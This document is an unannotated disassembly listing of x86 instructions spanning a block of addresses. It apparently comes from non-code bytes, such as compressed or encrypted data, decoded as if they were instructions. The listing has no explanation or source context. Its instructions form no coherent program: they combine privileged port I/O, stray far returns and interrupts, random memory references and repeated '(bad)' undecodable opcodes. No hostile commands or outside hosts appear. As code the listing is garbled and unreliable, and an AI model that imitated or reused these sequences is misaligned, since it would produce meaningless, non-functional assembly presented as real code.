  487f99:	fxch   st(0)
  487f9b:	adc    al,0x31
  487f9d:	sbb    BYTE PTR [esi],cl
  487f9f:	and    al,0x6b
  487fa1:	cmp    BYTE PTR [ebp+0x3ccaca93],dl
  487fa7:	mov    eax,ds:0x70605cad
  487fac:	das    
  487fad:	sub    ah,BYTE PTR [edi]
  487faf:	xchg   ebp,eax
  487fb0:	mov    ds:0xf57d8480,eax
  487fb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  487fb6:	pushf  
  487fb7:	cmp    al,0x57
  487fb9:	outs   dx,BYTE PTR ds:[esi]
  487fba:	jno    0x487f64
  487fbc:	xchg   esi,eax
  487fbd:	lock inc edi
  487fbf:	enter  0xb2cc,0x72
  487fc3:	stos   DWORD PTR es:[edi],eax
  487fc4:	lods   al,BYTE PTR ds:[esi]
  487fc5:	jae    0x487fa1
  487fc7:	in     al,dx
  487fc8:	and    eax,0xa4a54cf0
  487fcd:	repnz cmp DWORD PTR [edx+0x32143210],esi
  487fd4:	push   0xffffffb2
  487fd6:	xor    al,0xca
  487fd8:	dec    ecx
  487fd9:	gs in  eax,0x38
  487fdc:	aad    0xb1
  487fde:	pop    eax
  487fdf:	pop    esp
  487fe0:	repnz shr edi,0xc7
  487fe4:	mov    ah,0xdc
  487fe6:	inc    eax
  487fe7:	adc    eax,0x20a3861c
  487fec:	xor    esi,ecx
  487fee:	or     eax,0xebd93124
  487ff3:	and    DWORD PTR [edi+0x40fb602c],0x31
  487ffa:	xor    eax,0x5df23144
  487fff:	sahf   
  488000:	outs   dx,DWORD PTR ds:[esi]
  488001:	aaa    
  488002:	push   eax
  488003:	push   eax
  488004:	sub    ebp,DWORD PTR fs:[eax-0x12]
  488008:	repnz mov fs,ecx
  48800b:	ins    BYTE PTR es:[edi],dx
  48800c:	xor    esi,DWORD PTR [esi+edi*1+0x38]
  488010:	mov    BYTE PTR [ebp-0x45041ab6],ch
  488016:	mov    WORD PTR [ecx],cs
  488018:	nop
  488019:	inc    edi
  48801a:	cwde   
  48801b:	xor    ch,BYTE PTR [edi+ebx*2-0x54]
  48801f:	in     eax,0xf2
  488021:	cs xchg ebp,eax
  488023:	mov    al,0xb4
  488025:	mov    esp,0x5cd02c66
  48802a:	fisub  WORD PTR [ecx]
  48802c:	pop    edi
  48802d:	aam    0xa5
  48802f:	fsub   st,st(0)
  488031:	in     al,0x1c
  488033:	hlt    
  488034:	das    
  488035:	int    0xef
  488037:	mov    ebx,0x75fc0bf8
  48803c:	add    al,0x32
  48803e:	or     al,0x18
  488040:	xor    dl,BYTE PTR [edi+0x1c3ddba7]
  488046:	or     DWORD PTR [eax],esp
  488048:	xor    dh,BYTE PTR [ebx]
  48804a:	sub    BYTE PTR [esp+edi*1],al
  48804d:	repnz mov ecx,0x44402a54
  488053:	dec    esp
  488054:	clc    
  488055:	test   al,0x3c
  488057:	xchg   edi,eax
  488058:	dec    edx
  488059:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48805a:	pusha  
  48805b:	fs push 0x3f3ce870
  488061:	cld    
  488062:	lods   al,BYTE PTR ds:[esi]
  488063:	cmp    eax,0xc320bb7c
  488068:	cli    
  488069:	sbb    eax,0x8bdb3378
  48806e:	ror    DWORD PTR [esi+0x33],cl
  488071:	data16 adc bh,BYTE PTR [edx+ecx*1-0x80]
  488076:	jb     0x4880d7
  488078:	cs pop ebp
  48807a:	xor    DWORD PTR [edx],0x9
  48807d:	aam    0x4d
  48807f:	gs pushf 
  488081:	mov    edi,0xef3ba10f
  488086:	xchg   edi,eax
  488087:	push   cs
  488088:	retf   
  488089:	mov    al,ds:0x46d4fcbe
  48808e:	dec    eax
  48808f:	call   0x9fc7fa0c
  488094:	dec    ebx
  488095:	mov    al,ds:0x2cc2bea4
  48809a:	mov    ebx,0x8c47c7dc
  48809f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4880a0:	xchg   ebp,eax
  4880a1:	fcmovnu st,st(1)
  4880a3:	ja     0x4880b1
  4880a5:	aaa    
  4880a6:	rol    BYTE PTR [ebx-0x41c5503d],0xd0
  4880ad:	mov    ah,0x57
  4880b0:	mov    esi,0x3e8d7b4b
  4880b5:	xor    ah,al
  4880b7:	or     eax,0x15
  4880ba:	mov    ebp,0xe9da5e47
  4880bf:	ss out dx,al
  4880c1:	mov    ds:0xf00ac847,eax
  4880c6:	adc    al,0x33
  4880c8:	retf   
  4880c9:	imul   DWORD PTR [ebp+0x54353854]
  4880cf:	pop    ss
  4880d0:	pop    esp
  4880d1:	mov    bl,0xe4
  4880d3:	xlat   BYTE PTR ds:[ebx]
  4880d4:	add    bh,BYTE PTR [ebx]
  4880d6:	or     ebp,edi
  4880d8:	mov    edi,0x5e845105
  4880dd:	in     eax,0xf9
  4880df:	jo     0x48814a
  4880e1:	or     cl,BYTE PTR [eax-0x276bd474]
  4880e7:	bnd jl 0x48807f
  4880ea:	retf   0xaca8
  4880ed:	mov    al,0x33
  4880ef:	mov    eax,0xbe7977c0
  4880f4:	out    dx,eax
  4880f5:	int3   
  4880f6:	pop    edi
  4880f7:	shr    BYTE PTR [ebx],1
  4880f9:	fsub   QWORD PTR [esp+ebp*8+0x7e697955]
  488100:	pop    ebp
  488101:	hlt    
  488102:	or     eax,edi
  488104:	xor    eax,DWORD PTR [eax]
  488106:	xor    eax,DWORD PTR [eax+0x4f2e3310]
  48810c:	in     eax,0xf3
  48810e:	sbb    BYTE PTR [ebx],dh
  488110:	sbb    al,0x33
  488112:	and    al,0x64
  488114:	xor    al,0xbd
  488116:	js     0x4880d6
  488118:	or     eax,0x2b3c0d2f
  48811d:	inc    eax
  48811e:	pop    es
  48811f:	ror    DWORD PTR [eax-0x21],cl
  488122:	in     eax,0xc1
  488124:	in     eax,0x3e
  488126:	inc    esp
  488127:	pop    eax
  488128:	xchg   DWORD PTR [eax+0x64],esp
  48812b:	ja     0x488199
  48812d:	out    0xbb,eax
  48812f:	lods   al,BYTE PTR ds:[esi]
  488130:	cmp    al,0x24
  488132:	or     eax,0x902b8884
  488137:	stc    
  488138:	pop    esp
  488139:	cs xchg edi,eax
  48813b:	or     BYTE PTR [eax-0x58134b54],ch
  488141:	sub    ecx,edi
  488143:	in     eax,0x52
  488145:	int3   
  488146:	rcr    al,1
  488148:	int3   
  488149:	sbb    eax,0xc5e565e8
  48814e:	(bad)  
  488150:	in     al,dx
  488151:	xor    edi,DWORD PTR [eax+0x2c]
  488154:	mov    ch,0x8
  488156:	xor    al,0xa9
  488158:	jl     0x4881b0
  48815a:	xor    BYTE PTR ss:[esp+esi*1],cl
  48815e:	adc    BYTE PTR [esi+edx*4],dh
  488161:	les    ebp,FWORD PTR [ecx+ecx*2]
  488164:	mov    bh,0x72
  488166:	cmp    DWORD PTR [eax],esi
  488168:	xor    al,0xba
  48816a:	lds    esp,FWORD PTR [ebx+0x50]
  48816d:	pushf  
  48816e:	je     0x488107
  488170:	retf   
  488171:	push   esp
  488172:	pop    eax
  488173:	ret    0x7431
  488176:	js     0x4881ea
  488178:	push   edx
  488179:	pop    ecx
  48817a:	mov    ecx,0x98b9547c
  48817f:	pushf  
  488180:	xchg   edi,eax
  488181:	xchg   ebx,eax
  488182:	outs   dx,BYTE PTR ds:[esi]
  488183:	in     eax,0xa0
  488185:	stos   BYTE PTR es:[edi],al
  488186:	ret    
  488187:	stc    
  488188:	mov    esp,0x4e5cc4c0
  48818d:	sub    ch,BYTE PTR [ebx]
  48818f:	mov    BYTE PTR [ebp+0x56e8e4e0],dh
  488195:	mov    gs,WORD PTR [esp+ebp*4+0x3504c65d]
  48819c:	or     BYTE PTR ds:0xe5ca350c,dh
  4881a2:	jbe    0x48821d
  4881a4:	fld    TBYTE PTR [eax]
  4881a6:	xor    DWORD PTR [eax+esi*1],ebp
  4881a9:	jl     0x48816d
  4881ab:	xchg   edi,eax
  4881ac:	retf   0xb623
  4881af:	dec    esp
  4881b0:	mov    ds:0xf4cc33f0,eax
  4881b5:	xor    ebp,DWORD PTR [esp+edi*4+0x50fc9c3c]
  4881bc:	test   al,0x14
  4881be:	xor    al,0x18
  4881c0:	xor    al,0x5c
  4881c2:	fild   QWORD PTR cs:[ebx+0x2b8c0a20]
  4881c9:	cmp    BYTE PTR [esp+eax*2],bh
  4881cc:	sahf   
  4881cd:	retf   
  4881ce:	in     eax,0xf2
  4881d0:	ins    BYTE PTR es:[edi],dx
  4881d1:	pop    esp
  4881d2:	pusha  
  4881d3:	push   0xb973ca54
  4881d8:	pop    esp
  4881d9:	add    BYTE PTR [esp+ecx*4+0x3df79534],0xdf
  4881e1:	xor    eax,0x6a81fa4
  4881e6:	jecxz  0x488198
  4881e8:	xor    bl,BYTE PTR [edi*1-0x68c34435]
  4881ef:	enter  0x7cc,0xd4
  4881f3:	data16 add al,0x59
  4881f6:	stc    
  4881f7:	cs mov ebx,0xf03d93ec
  4881fd:	clc    
  4881fe:	sub    ah,ah
  488200:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  488201:	adc    BYTE PTR ds:0x5959a565,dh
  488207:	adc    al,0x35
  488209:	sbb    al,0x35
  48820b:	int3   
  48820c:	or     eax,0xcf382934
  488211:	gs or  eax,0xfeac4038
  488217:	push   eax
  488218:	jns    0x4881c8
  48821a:	in     al,dx
  48821b:	jo     0x488271
  48821d:	cmp    eax,0xa7e65835
  488222:	inc    ebp
  488223:	jo     0x4881ee
  488225:	jae    0x48829e
  488227:	cmp    DWORD PTR [eax+edi*2+0x31],esi
  48822b:	sub    dh,BYTE PTR [edx+0x47]
  48822e:	xchg   esp,eax
  48822f:	fsubr  QWORD PTR [edx]
  488231:	mov    ebx,0x639c98cb
  488236:	aaa    
  488237:	leave  
  488238:	mov    eax,0xa4e5bc31
  48823d:	mov    dl,0xbb
  48823f:	rcl    BYTE PTR [ebp-0x1f23373f],0xca
  488246:	fxch   st(2)
  488248:	retf   0x72e4
  48824b:	add    DWORD PTR [eax],0x36046336
  488251:	pop    esp
  488252:	outs   dx,BYTE PTR ds:[esi]
  488253:	xchg   ebp,eax
  488254:	iret   
  488255:	or     BYTE PTR [esi],dh
  488257:	push   ds
  488258:	lds    esp,FWORD PTR [ecx+esi*1]
  48825b:	sub    BYTE PTR [edx+esi*2],ch
  48825e:	cmp    DWORD PTR [ecx+0x48c862ac],ebp
  488264:	dec    esp
  488265:	push   eax
  488266:	retf   0xe4e5
  488269:	mov    ecx,0x6c4755ad
  48826e:	jo     0x4882e4
  488270:	lods   al,BYTE PTR ds:[esi]
  488271:	pop    esp
  488272:	outs   dx,BYTE PTR ds:[esi]
  488273:	xchg   edi,eax
  488274:	xchg   esi,eax
  488275:	nop
  488276:	xchg   ebp,eax
  488277:	xchg   esp,eax
  488278:	cwde   
  488279:	push   ebp
  48827a:	jbe    0x488288
  48827c:	mov    dl,0x61
  48827e:	test   eax,0x355cdeb4
  488283:	fs ret 
  488285:	mov    bl,0xca
  488287:	cmp    al,0x26
  488289:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48828a:	or     al,0x7c
  48828c:	xor    eax,0xfbcb4f80
  488291:	sub    ch,bh
  488293:	mov    BYTE PTR [esi],ah
  488295:	pushf  
  488296:	mov    al,ds:0x258a41d
  48829b:	sbb    ah,BYTE PTR [esi]
  48829d:	in     eax,dx
  48829e:	mov    esp,0x268c30ac
  4882a3:	les    esi,FWORD PTR [eax+ecx*8+0x5de54a97]
  4882aa:	ror    BYTE PTR [eax+edi*2-0x7c0b1318],1
  4882b1:	lods   al,BYTE PTR ds:[esi]
  4882b2:	lods   al,BYTE PTR ds:[esi]
  4882b3:	cmp    al,0x60
  4882b5:	or     al,0x36
  4882b7:	adc    BYTE PTR [esi],dh
  4882b9:	sbb    BYTE PTR [esi+0x369a5e41],bh
  4882bf:	push   eax
  4882c0:	xor    BYTE PTR [esi],dh
  4882c2:	xor    al,0x47
  4882c4:	cmp    al,0x73
  4882c6:	enter  0x7ba5,0x3c
  4882ca:	gs push esp
  4882cc:	pop    eax
  4882cd:	pusha  
  4882ce:	pop    esp
  4882cf:	sahf   
  4882d0:	out    dx,eax
  4882d1:	lds    ebp,FWORD PTR [ecx+eiz*4]
  4882d4:	js     0x48826f
  4882d6:	jl     0x48831b
  4882d8:	test   BYTE PTR [edi+0xcf2ec77],dl
  4882de:	pushf  
  4882df:	pop    ebx
  4882e0:	mov    al,ds:0xc4a84212
  4882e5:	cvtps2pi mm7,QWORD PTR [esi]
  4882e8:	in     al,dx
  4882e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4882ea:	in     eax,0xb8
  4882ec:	pop    ss
  4882ed:	mov    esp,0x43b9e436
  4882f2:	test   DWORD PTR [esi+0x9],0x75f18fc4
  4882f9:	inc    ebp
  4882fa:	fcom   DWORD PTR [ebx-0x231a3519]
  488300:	loopne 0x4882e4
  488302:	cmc    
  488303:	inc    esi
  488304:	cld    
  488305:	data16 das 
  488307:	iret   
  488308:	retf   0x3700
  48830b:	add    al,0x37
  48830d:	loopne 0x48832f
  48830f:	aaa    
  488310:	xor    DWORD PTR [ecx+edi*1],esp
  488313:	test   eax,0x4c285cac
  488318:	ja     0x48835e
  48831a:	dec    eax
  48831b:	in     eax,0xe4
  48831d:	mov    ecx,0x4fad4c72
  488322:	inc    edi
  488323:	push   0xca93976c
  488328:	retf   0x5570
  48832b:	dec    ebp
  48832c:	mov    WORD PTR [eax+0x2adcb994],ss
  488332:	sub    ebp,DWORD PTR [edi+ebx*1-0x474b3850]
  488339:	retf   0x56e5
  48833c:	pop    ecx
  48833d:	push   edi
  48833e:	jne    0x488314
  488340:	arpl   ax,bx
  488342:	fdivr  QWORD PTR [esi]
  488344:	das    
  488345:	mov    bh,0xca
  488347:	jg     0x488397
  488349:	clc    
  48834a:	xor    esp,edi
  48834c:	add    BYTE PTR [eax],bh
  48834e:	push   esi
  48834f:	xchg   BYTE PTR [eax+0x1c562987],bl
  488355:	cmp    ch,ch
  488357:	int3   
  488358:	sbb    cl,al
  48835a:	cli    
  48835b:	jl     0x488305
  48835d:	xor    al,0x2
  48835f:	in     al,0xe8
  488361:	xchg   ebx,eax
  488362:	lock mov al,ds:0x5655eea5
  488368:	jbe    0x4883bf
  48836a:	or     BYTE PTR [edi],dh
  48836c:	or     al,0x37
  48836e:	adc    al,0xa
  488370:	mov    WORD PTR [ebx-0x5b],ss
  488373:	bnd jl 0x488345
  488376:	sub    al,0x37
  488378:	xor    BYTE PTR [edi],ah
  48837a:	cmp    BYTE PTR [eax+edx*2-0x8],bh
  48837e:	push   ebp
  48837f:	sahf   
  488380:	dec    ebx
  488381:	push   esp
  488382:	pop    esp
  488383:	pop    esp
  488384:	je     0x4883a3
  488386:	js     0x4883bf
  488388:	es in  eax,dx
  48838a:	mov    esp,0x308005a1
  48838f:	cmp    BYTE PTR [esi],ah
  488391:	cwde   
  488392:	pop    esp
  488393:	sub    cl,bh
  488395:	xlat   BYTE PTR ds:[ebx]
  488396:	mov    ah,0x9c
  488398:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  48839a:	sbb    BYTE PTR [eax+eax*8-0x78830d5b],bh
  4883a1:	enter  0xf4be,0xa4
  4883a5:	loopne 0x48838b
  4883a7:	mov    cl,0xd5
  4883a9:	jbe    0x488389
  4883ab:	in     al,dx
  4883ac:	sar    BYTE PTR es:[eax+0x4],1
  4883b0:	cmp    BYTE PTR [ecx+0x8],bl
  4883b3:	cmp    BYTE PTR [eax-0x6a0844c8],bh
  4883b9:	or     dh,BYTE PTR [ebx+ebp*1+0x380c201d]
  4883c0:	cwde   
  4883c1:	out    0x3b,eax
  4883c3:	xlat   BYTE PTR ds:[ebx]
  4883c4:	push   0x8c343f38
  4883c9:	sub    al,BYTE PTR [edi+0x3e]
  4883cc:	aaa    
  4883cd:	cs ds aad 0x45
  4883d1:	inc    eax
  4883d2:	cmp    BYTE PTR [eax+edi*1+0x48],al
  4883d6:	jb     0x488411
  4883d8:	jmp    0x321bf133
  4883dd:	fs push 0xa4e5ca6c
  4883e3:	mov    dl,0x48
  4883e5:	aam    0x88
  4883e7:	mov    WORD PTR [eax-0x356c68d5],ss
  4883ed:	dec    ebx
  4883ee:	fldcw  WORD PTR [eax+esi*4-0x538dea4c]
  4883f5:	pop    esp
  4883f6:	dec    esi
  4883f7:	sahf   
  4883f8:	inc    esi
  4883f9:	rcl    ah,1
  4883fb:	fdivr  DWORD PTR [ecx+0x3972a571]
  488401:	test   eax,0x31fcf8f4
  488406:	retf   0xe567
  488409:	in     al,dx
  48840a:	sbb    BYTE PTR [ecx],bh
  48840c:	(bad)  
  48840d:	sbb    al,0x39
  48840f:	and    BYTE PTR [ecx],bh
  488411:	(bad)  
  488412:	shl    BYTE PTR [ebx+0x50],cl
  488415:	cs mov bh,0x3c
  488418:	xor    DWORD PTR [eax+0x44],eax
  48841b:	inc    ecx
  48841c:	push   edx
  48841d:	daa    
  48841e:	xchg   ebp,eax
  48841f:	xchg   ebp,eax
  488420:	dec    ebx
  488421:	dec    eax
  488422:	dec    esp
  488423:	(bad)  
  488424:	xlat   BYTE PTR ds:[ebx]
  488425:	pusha  
  488426:	fs js  0x4883d2
  488429:	lods   al,BYTE PTR ds:[esi]
  48842a:	jl     0x48845d
  48842c:	push   0xa384d86d
  488431:	dec    esp
  488432:	xlat   BYTE PTR ds:[ebx]
  488433:	loope  0x4883ee
  488435:	je     0x48845c
  488437:	push   eax
  488438:	pop    eax
  488439:	jo     0x4883f4
  48843b:	jo     0x488464
  48843d:	test   eax,0x744b9e54
  488442:	jl     0x488494
  488444:	xchg   esp,eax
  488445:	cwde   
  488446:	cs xchg ebp,eax
  488448:	retf   0xa073
  48844b:	xor    al,0xb8
  48844d:	mov    esp,0x5b27bec4
  488452:	jl     0x488470
  488454:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  488455:	xchg   edi,eax
  488456:	fdivr  QWORD PTR [eax]
  488458:	cmp    eax,0x76e85be0
  48845d:	cvtps2pd xmm7,QWORD PTR [ecx+0x4]
  488461:	add    BYTE PTR [ecx],bh
  488463:	mov    al,ds:0x390c2739
  488468:	iret   
  488469:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48846a:	repnz ins BYTE PTR es:[edi],dx
  48846c:	in     al,dx
  48846d:	mov    ds:0xd0302824,eax
  488472:	push   esp
  488473:	sub    cl,BYTE PTR [edi+0x3b]
  488476:	cmp    dl,BYTE PTR [eax+esi*4+0x6c]
  48847a:	jo     0x4884d9
  48847c:	or     cl,dh
  48847e:	mov    ebx,0x90902678
  488483:	mov    BYTE PTR [eax+eiz*2+0x35d74b9e],cl
  48848a:	nop
  48848b:	aas    
  48848c:	xchg   esp,eax
  48848d:	pushf  
  48848e:	js     0x488475
  488490:	jb     0x4884e4
  488492:	pop    ecx
  488493:	jmp    0x2bb0:0xaca8d619
  48849a:	xchg   edi,eax
  48849b:	xchg   ebx,eax
  48849c:	ja     0x4884fb
  48849e:	pop    ebp
  48849f:	inc    ebx
  4884a0:	xor    ah,cl
  4884a2:	rcl    ah,1
  4884a4:	adc    ah,BYTE PTR [ebx-0x61b1a354]
  4884aa:	inc    ebp
  4884ab:	lock hlt 
  4884ad:	clc    
  4884ae:	(bad)  
  4884af:	mov    ds:0xac8e5679,al
  4884b4:	adc    al,0x3a
  4884b6:	sbb    BYTE PTR [edx],bh
  4884b8:	sbb    al,0x3a
  4884ba:	ins    BYTE PTR es:[edi],dx
  4884bb:	jae    0x4884a2
  4884bd:	jb     0x488531
  4884bf:	cmp    BYTE PTR [eax+eax*2],bh
  4884c2:	dec    esp
  4884c3:	xor    eax,0xcb95de47
  4884c8:	leave  
  4884c9:	pop    esp
  4884ca:	pusha  
  4884cb:	fs cli 
  4884cd:	adc    ecx,DWORD PTR [eax-0x6c]
  4884d0:	sub    BYTE PTR [ebx-0x7bb1a354],0x88
  4884d7:	pusha  
  4884d8:	test   eax,0x654931a4
  4884dd:	in     eax,0x72
  4884df:	test   al,0xac
  4884e1:	xchg   ebp,eax
  4884e3:	enter  0x9527,0x95
  4884e7:	retf   
  4884e8:	int3   
  4884e9:	sar    BYTE PTR [ebp-0x1f],1
  4884ec:	in     al,dx
  4884ed:	lock pop esp
  4884ef:	sub    cl,BYTE PTR [edi]
  4884f1:	das    
  4884f2:	hlt    
  4884f3:	cmp    bl,BYTE PTR [edx]
  4884f5:	mov    ah,0xb8
  4884f7:	shl    ah,0x7c
  4884fa:	push   cs
  4884fb:	cli    
  4884fc:	pop    eax
  4884fd:	mov    ds:0x8dc1fad,eax
  488502:	gs push edi
  488504:	jns    0x4884fe
  488506:	and    esp,0x5bfc48b6
  48850c:	add    BYTE PTR [edx],bh
  48850e:	ret    
  48850f:	hlt    
  488510:	jmp    0x488570
  488512:	or     BYTE PTR [edx],cl
  488514:	cmp    BYTE PTR [edi],ah
  488516:	and    BYTE PTR ds:0x2cdb3a24,bl
  48851c:	ds xchg ebp,eax
  48851e:	out    dx,al
  48851f:	jnp    0x488533
  488521:	and    al,0x8d
  488523:	inc    esp
  488524:	adc    dh,BYTE PTR [ebx*2+0x575f3c50]
  48852b:	jns    0x488545
  48852d:	push   0x74276ceb
  488532:	or     BYTE PTR [ebp-0x7356ad19],dl
  488538:	nop
  488539:	cwde   
  48853a:	add    BYTE PTR [eax+0x2a5cf9e5],dh
  488540:	mov    ah,0xbc
  488542:	in     al,0xa2
  488544:	aam    0xa9
  488546:	push   esp
  488547:	sahf   
  488548:	dec    ebx
  488549:	fsub   st,st(0)
  48854b:	sar    al,1
  48854d:	cld    
  48854e:	xchg   ebp,eax
  48854f:	add    eax,0x3b0479a6
  488554:	mov    esp,0x10c730da
  488559:	(bad)  [ebx+edi*4-0x6f]
  48855d:	cmp    edx,DWORD PTR [esi+ecx*1]
  488560:	or     bl,BYTE PTR [eax]
  488562:	xor    BYTE PTR [edi+0x72e577d1],ch
  488568:	push   edx
  488569:	xor    al,0x38
  48856b:	cmp    al,0x8d
  48856d:	in     al,0x46
  48856f:	(bad)  
  488570:	jmp    0x58dc1ca3
  488575:	pop    esp
  488576:	pusha  
  488577:	outs   dx,DWORD PTR ds:[esi]
  488578:	xor    DWORD PTR [ecx+ecx*2-0x49],edi
  48857c:	jb     0x4885b7
  48857e:	add    BYTE PTR [esp+edi*8+0x27a0c7c8],0x95
  488586:	xchg   ebp,eax
  488587:	retf   
  488588:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  488589:	test   al,0xfa
  48858b:	retf   0xc8c4
  48858e:	pushf  
  48858f:	push   esp
  488590:	push   esi
  488591:	cs int3 
  488593:	add    DWORD PTR [eax-0x18],esi
  488596:	in     al,dx
  488597:	jb     0x48858f
  488599:	push   edx
  48859a:	mov    ecx,0x3c0c4af0
  48859f:	xchg   ebp,eax
  4885a0:	adc    BYTE PTR [edi+edx*4],bh
  4885a3:	pop    ebx
  4885a4:	in     eax,0xb3
  4885a6:	adc    al,0x3c
  4885a8:	mov    cl,0xcf
  4885aa:	xor    BYTE PTR [ecx],dh
  4885ac:	xor    al,0x38
  4885ae:	pop    esp
  4885af:	dec    esi
  4885b0:	sub    ch,BYTE PTR [ebx]
  4885b2:	daa    
  4885b3:	loop   0x488609
  4885b5:	pop    eax
  4885b6:	pop    esp
  4885b7:	cmp    al,0xd9
  4885b9:	add    BYTE PTR [ebx+0x1c32f850],ch
  4885bf:	cmp    esp,DWORD PTR [eax]
  4885c1:	cmp    eax,DWORD PTR [ebx-0x26]
  4885c4:	jns    0x488600
  4885c6:	xor    DWORD PTR [eax],ebp
  4885c8:	xchg   esp,eax
  4885c9:	xor    al,BYTE PTR [eax+0x36]
  4885cc:	mov    ecx,0x4c44973c
  4885d1:	ins    BYTE PTR es:[edi],dx
  4885d2:	fs adc ch,bl
  4885d5:	lock pop esp
  4885d7:	sahf   
  4885d8:	push   0xc9547009
  4885dd:	mov    BYTE PTR [eax],dl
  4885df:	dec    edx
  4885e0:	in     eax,0x7d
  4885e2:	mov    cl,BYTE PTR [edx+0x63]
  4885e5:	xchg   esp,eax
  4885e6:	es cmp al,0xac
  4885e9:	push   edx
  4885ea:	test   eax,0xb8b0973c
  4885ef:	sbb    al,dl
  4885f1:	aam    0x5e
  4885f3:	sub    cl,bh
  4885f5:	out    0xdc,eax
  4885f7:	hlt    
  4885f8:	mov    eax,ds:0x3c00f8f4
  4885fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4885fe:	repnz pop ecx
  488600:	imul   esp,eax,0x3c1c3c18
  488606:	and    al,0xf2
  488608:	pop    esp
  488609:	sub    dl,BYTE PTR [ebp+0x48403cc4]
  48860f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  488610:	fisub  WORD PTR [eax]
  488612:	pop    es
  488613:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  488614:	pusha  
  488615:	xor    al,0x3c
  488617:	ins    BYTE PTR es:[edi],dx
  488618:	xor    BYTE PTR [ebp+eiz*8-0x98fad8e],al
  48861f:	js     0x48869d
  488621:	sub    BYTE PTR [ebx],0x97
  488624:	xchg   ebx,eax
  488625:	ja     0x4885f0
  488627:	outs   dx,BYTE PTR ds:[esi]
  488628:	inc    esi
  488629:	xor    BYTE PTR [eax+eiz*4-0x517c625c],bl
  488630:	pop    esp
  488631:	dec    esi
  488632:	sahf   
  488633:	inc    edi
  488634:	rol    ah,0xc8
  488637:	mov    al,ds:0x72b845c9
  48863c:	cmp    DWORD PTR [ecx-0x1c],edi
  48863f:	call   0x46271630
  488644:	ins    BYTE PTR es:[edi],dx
  488645:	sub    ah,BYTE PTR [ebx]
  488647:	xlat   BYTE PTR ds:[ebx]
  488648:	cmp    BYTE PTR ds:0x88bd3d3d,bh
  48864e:	(bad)  
  488650:	in     eax,0xa6
  488652:	xor    DWORD PTR [eax],esi
  488654:	xor    al,0x7a
  488656:	int3   
  488657:	arpl   WORD PTR [eax+0x3c],dx
  48865a:	push   edi
  48865b:	cs daa 
  48865d:	push   esp
  48865e:	pop    eax
  48865f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  488660:	loope  0x4886a8
  488662:	je     0x4886b6
  488664:	pop    ecx
  488665:	mov    ecx,0xc07c789c
  48866a:	lds    ebx,FWORD PTR [eax+0x72e5655b]
  488670:	pushf  
  488671:	mov    al,ds:0x31bc7897
  488676:	rcr    DWORD PTR [edx+ebp*1-0x69],0xc0
  48867b:	les    edi,FWORD PTR [eax+eiz*8-0xe]
  48867f:	jo     0x488649
  488681:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  488682:	xor    BYTE PTR [eax+ecx*4-0x56937570],al
  488689:	mov    esp,0xaca8a54b
  48868e:	mov    ah,0x26
  488690:	dec    esp
  488691:	int3   
  488692:	jl     0x488629
  488694:	out    0x52,eax
  488696:	rcr    al,1
  488698:	sub    al,dh
  48869a:	xor    esp,0x8779575d
  4886a0:	cld    
  4886a1:	xor    BYTE PTR [eax],dl
  4886a3:	adc    al,0xbd
  4886a5:	sbb    BYTE PTR [eax],cl
  4886a7:	mov    bl,0xc6
  4886a9:	addr16 mov bl,0x26
  4886ac:	and    BYTE PTR ds:0x3d38a0f8,bh
  4886b2:	sbb    ebp,DWORD PTR [ecx]
  4886b4:	cmp    BYTE PTR [esi-0x6b],bh
  4886b7:	out    0x44,eax
  4886b9:	fcomp  DWORD PTR [ebp+ebx*1+0x60]
  4886bd:	cmp    eax,0x76931a6d
  4886c2:	fidiv  WORD PTR [eax]
  4886c4:	shl    BYTE PTR [esi],0x80
  4886c7:	push   cs
  4886c8:	mov    ecx,0x3d28a53c
  4886cd:	xor    ch,BYTE PTR [esp+eiz*4-0x1ab46f58]
  4886d4:	stc    
  4886d5:	cdq    
  4886d6:	mov    al,0x98
  4886d8:	enter  0x95cc,0x6
  4886dc:	cmp    ch,bh
  4886de:	aam    0x30
  4886e0:	js     0x4886ed
  4886e2:	cmp    eax,0x3c8dd93d
  4886e7:	aaa    
  4886e8:	xchg   ebx,eax
  4886e9:	stc    
  4886ea:	inc    esi
  4886eb:	ds xor DWORD PTR ds:[esi+edi*1],ecx
  4886f0:	retf   0xa4e5
  4886f3:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4886f5:	sti    
  4886f6:	sub    BYTE PTR [eax+esi*1],ch
  4886f9:	sub    edx,DWORD PTR [edi-0x1ce25425]
  4886ff:	dec    esp
  488700:	xor    DWORD PTR [eax+0x54],edx
  488703:	fnop   
  488705:	test   al,0x5c
  488707:	dec    esi
  488708:	sub    dh,BYTE PTR [eax+0x74]
  48870b:	js     0x48876e
  48870d:	push   esp
  48870e:	inc    esi
  48870f:	stos   BYTE PTR es:[edi],al
  488710:	jno    0x4886dc
  488712:	xor    BYTE PTR [esi],bh
  488714:	ds ds xchg ebp,eax
  488717:	retf   
  488718:	dec    ebp
  488719:	(bad)  [esp+ebx*8+0x31]
  48871d:	mov    esp,0x2e551ec0
  488722:	daa    
  488723:	xchg   ebp,eax
  488724:	int    0xdc
  488726:	loopne 0x48870c
  488728:	inc    edi
  488729:	sub    ah,BYTE PTR [ebx]
  48872b:	aad    0x18
  48872d:	and    dh,BYTE PTR [eax]
  48872f:	aas    
  488730:	aas    
  488731:	aas    
  488732:	retf   0xa6e5
  488735:	ins    BYTE PTR es:[edi],dx
  488736:	and    ebx,edi
  488738:	xor    DWORD PTR [eax],ebp
  48873a:	sub    al,0xbc
  48873c:	xor    al,0x2c
  48873e:	fstp   QWORD PTR [ecx+ebp*8]
  488741:	arpl   WORD PTR [eax+0x48],cx
  488744:	in     al,dx
  488745:	lock cmp eax,0x66e1e565
  48874b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48874c:	clc    
